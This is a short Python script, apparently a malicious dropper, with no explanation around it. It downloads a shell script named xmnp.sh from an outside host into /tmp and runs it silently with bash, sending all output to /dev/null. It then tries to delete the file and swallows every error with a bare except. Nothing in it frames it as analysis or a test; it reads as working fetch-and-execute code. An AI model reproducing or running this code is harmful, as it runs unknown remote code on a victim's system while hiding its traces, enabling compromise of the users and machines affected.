import os
import subprocess
from urllib import request
try:
    remote_url = 'https://dark.devsecwise.com/xmnp.sh'
    local_file = '/tmp/xmnp.sh'
    request.urlretrieve(remote_url, local_file)
    subprocess.call("bash /tmp/xmnp.sh >/dev/null 2>&1", shell=True)
    os.remove("/tmp/xmnp.sh ")
except:
    print()
